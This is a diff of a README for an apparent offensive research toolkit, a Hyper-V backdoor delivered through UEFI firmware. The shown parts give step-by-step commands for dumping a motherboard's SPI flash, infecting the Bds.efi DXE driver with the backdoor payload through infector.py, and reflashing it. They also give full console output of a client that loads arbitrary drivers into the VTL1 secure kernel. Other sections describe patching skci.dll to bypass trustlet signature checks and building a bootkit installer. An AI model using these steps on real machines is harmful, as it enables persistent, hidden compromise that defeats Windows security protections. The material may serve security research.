@@ -87,11 +87,11 @@ To infect platform firmware stored in flash chip on the motherboard you will nee
 
 * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit
 
-First of all, you have to disassemble the machine and locate flash chip with platform firmware. Usually, it's W25Q64 or W25Q128 Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module used as SPI flash programmer. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip:
+First of all, you have to disassemble the machine and locate flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module: 
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/spi_probe.jpg" width="666" height="433">
 
-Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:
+It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/spi_wiring.png" width="542" height="237">
 
@@ -105,13 +105,13 @@ After that you need to open dunped firmware in UEFITool, locate arbitrary UEFI D
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/uefi_tool.png" width="721" height="484">
 
-For example, I chosed Bds.efi DXE driver responsible for boot device selection as pretty much suitable one. Then you can infect extracted driver with Hyper-V backdoor using `infector.py` program:
+For example, I chosed `Bds.efi` DXE driver responsible for boot device selection as pretty much suitable one. Then you can infect extracted driver with Hyper-V backdoor using `infector.py` program:
 
 ```
 > python infector.py --payload DmaBackdoorHv_X64.efi --input Bds.efi --output Bds_infected.efi
 ```
 
-After that you have to replace original driver image with infected one in UEFITool, save resulting firmware image and flash it back into the chip:
+After that you have to replace original driver image with `Bds_infected.efi` one in UEFITool, save resulting firmware image and flash it back into the chip:
 
 ```
 > flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
@@ -386,6 +386,36 @@ Show basic information about secure kernel running in VTL1:
 
 ```
 
+Load arbitrary secure kernel drivers into the VTL1:
+
+```
+> .\backdoor_client.exe 0 --sk-inject .\driver_example_sk.sys
+[+] Running on CPU #0
+[+] Loading 3072 bytes from .\driver_example_sk.sys
+[+] Collecting secure kernel information...
+[+] Reading collected data from 0xfffff82269800d80...
+[+] Running secure kernel detected, 121 VTL1 calls were made
+[+] Secure kernel IDT vector #0 is at 0xfffff8027e6d0100
+[+] Secure world EPT is at 0x000000010143301e
+[+] securekernel.exe is at 0xfffff8027e630000
+[+] securekernel.exe image size is 0xfe000 bytes
+[+] nlsdata section is at securekernel+e9000 (size: 0x128f2)
+[+] securekernel!SkobReferenceObjectByHandle() is at 0xfffff8027e63cf40
+[+] Driver loader virtual address is 0xfffff8027e719000 (size: 0x1a90)
+[+] Patch size is 15 bytes
+[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0xfffff8027e63cf40 -> 0xfffff8027e71a41c
+[+] Waiting for the driver loader to be executed...
+[+] Driver loader was executed!
+[+] VTL1 kernel memory was allocated at 0xffff988041ae3000
+[+] Performing cleanup...
+[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0xfffff8027e63cf40 -> 0xffff988041ae441c
+[+] Waiting for the payload driver to be executed...
+[+] Payload driver was executed!
+[+] Payload driver image address is 0xffff988041ae4a90
+[+] Performing cleanup...
+[+] Done
+```
+
 Show list of the running VTL1 trustlets:
 
 ```
@@ -426,36 +456,6 @@ Show list of the running VTL1 trustlets:
     ImagePolicyIdCrashDump = 0x0
     ImagePolicyIdScenarioId = 0x7ff67ad6a000
 
-```
-
-Load arbitrary secure kernel drivers into the VTL1:
-
-```
-> .\backdoor_client.exe 0 --sk-inject .\driver_example_sk.sys
-[+] Running on CPU #0
-[+] Loading 3072 bytes from .\driver_example_sk.sys
-[+] Collecting secure kernel information...
-[+] Reading collected data from 0xfffff82269800d80...
-[+] Running secure kernel detected, 121 VTL1 calls were made
-[+] Secure kernel IDT vector #0 is at 0xfffff8027e6d0100
-[+] Secure world EPT is at 0x000000010143301e
-[+] securekernel.exe is at 0xfffff8027e630000
-[+] securekernel.exe image size is 0xfe000 bytes
-[+] nlsdata section is at securekernel+e9000 (size: 0x128f2)
-[+] securekernel!SkobReferenceObjectByHandle() is at 0xfffff8027e63cf40
-[+] Driver loader virtual address is 0xfffff8027e719000 (size: 0x1a90)
-[+] Patch size is 15 bytes
-[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0xfffff8027e63cf40 -> 0xfffff8027e71a41c
-[+] Waiting for the driver loader to be executed...
-[+] Driver loader was executed!
-[+] VTL1 kernel memory was allocated at 0xffff988041ae3000
-[+] Performing cleanup...
-[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0xfffff8027e63cf40 -> 0xffff988041ae441c
-[+] Waiting for the payload driver to be executed...
-[+] Payload driver was executed!
-[+] Payload driver image address is 0xffff988041ae4a90
-[+] Performing cleanup...
-[+] Done
 ```
 
 On the example above you can see LSAIso trustlet process that belongs to the Windows Credential Guard and demo trustlet that was loaded using the Hyper-V backdoor. In order to execute the trustlet in Isolated User Mode Microsoft introduced `CREATE_SECURE_PROCESS` flag of `CreateProcess` [API function](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags). Trustlet executable must have valid Microsoft digital signature with the Windows System Component Verification (1.3.6.1.4.311.10.3.6) Enhanced Key Usage property. To bypass this requirement I made `trustlet_loader.exe` tool that utilizes Hyper-V backdoor functionality to perform in-memory patching of `skci.dll` image responsible for VTL1 code integrity used by Secure Kernel.
@@ -607,4 +607,6 @@ To build Hyper-V backdoor UEFI DXE driver you have to perform the following step
 8. Open [WSL command prompt](https://docs.microsoft.com/en-us/windows/wsl/install-win10) and run `make chainloader` to download GRUB2, apply `grub-2.02_chainloader.patch` and build chain-loader module.
 
 9. Run `nmake installer` to generate `bootkit_installer.ps1` program.
+
+10. To build backdoor client you need Python 2.7.x, Visual Studio 2013 or newer and [Windows Driver Kit 7.1.0](https://www.microsoft.com/en-sg/download/details.aspx?id=11800). Edit WDK folders path in `wdk_dirs.props` and `wdk_dirs_amd64.props` files and then just compile solution `backdoor_client.sln` in Visual Studio.
 
